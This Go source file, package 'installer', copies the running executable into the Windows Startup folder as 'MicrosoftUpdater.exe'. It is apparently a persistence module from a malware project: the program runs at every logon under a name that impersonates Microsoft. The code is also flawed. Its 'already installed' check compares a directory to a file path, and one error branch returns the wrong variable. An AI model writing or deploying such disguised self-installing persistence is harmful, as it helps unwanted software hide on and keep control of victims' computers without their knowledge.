package installer

import (
	"fmt"
	"os"
)

func InstallerWin() error {

	appdata := os.Getenv("appdata")

	path := appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MicrosoftUpdater.exe"
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		return err
	}

	if cwd == path {
		return nil
	}

	f, err := os.ReadFile(os.Args[0])

	if err != nil {
		fmt.Println(err)
		return err
	}

	e := os.WriteFile(path, f, os.ModePerm)

	if e != nil {
		fmt.Println(err)
		return err
	}

	return nil
}
